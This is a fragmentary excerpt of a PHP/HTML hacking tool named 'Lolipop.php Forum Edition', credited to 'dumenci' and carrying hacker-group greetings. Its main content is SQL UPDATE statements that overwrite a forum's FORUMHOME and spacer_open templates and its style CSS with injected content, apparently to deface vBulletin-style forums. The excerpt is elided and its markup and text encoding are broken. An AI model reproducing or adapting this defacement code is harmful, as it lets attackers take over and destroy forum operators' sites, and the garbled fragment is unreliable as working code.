...
<table border='1' width='100%' id='table1' border='1' cellPadding=5 cellSpacing=0 borderColorDark=#666666 bordercolorlight='#C0C0C0'>
    <tr>
        <td><font color='#000000'>
          ...
          <font size='5'><b style='color:black;background-color:#ffff66'>Lolipop BETA</b> ( Powered By <font color='#FF0000'><strong>dumenci</a></strong></font> )</font></font>
...
echo '<td><font color="#CC0000"><strong>Greetz</strong></font><font color="#000000">=] <strong>The_Bekir</strong>,<em><strong>Kinsize(Manevi)</strong></em>,<strong>Zeberus</strong>,<em><strong>Agd_Scorp</strong></em>,<strong>MEFISTO</strong>,<em><strong>DeaDBonE</strong></em>,<strong>CyberGhost,</strong><em><strong>MecTruy</strong></em>,<strong>Seydo</strong>,<em><strong>Manner</strong> </em></font>    </tr>
';
...
$loli1 = "UPDATE template SET template='".$set_index."".$dumenci."' WHERE title='spacer_open'";
$loli2 = "UPDATE template SET template='".$set_index."".$dumenci."' WHERE title='FORUMHOME'";
$loli3 = "UPDATE style SET css='".$set_index."".$dumenci."', stylevars='', csscolors='', editorstyles=''";
...
<td width='25%' height='1' valign='top' style='font-family: verdana; color: #000000; font-size: 11px'>
 ...
 <p><strong>Lolipop.php</strong> Forum Edition. 27 Kasim 2008 Persembe <strong>21:45 </strong>de kodlanip tamamlanmistir.I?eriginin degistirilmesi sonraki versiyonlarin olusmasina engel olacaktir. </p>
 <p><strong>Coded By dumenci | IMHATIMI.ORG ==> IMTSOFT </strong></p>
<p><strong>BugBUSTERS Team : N?tRoot,MecTruy</strong><br>
</p></td>
</tr></table>";
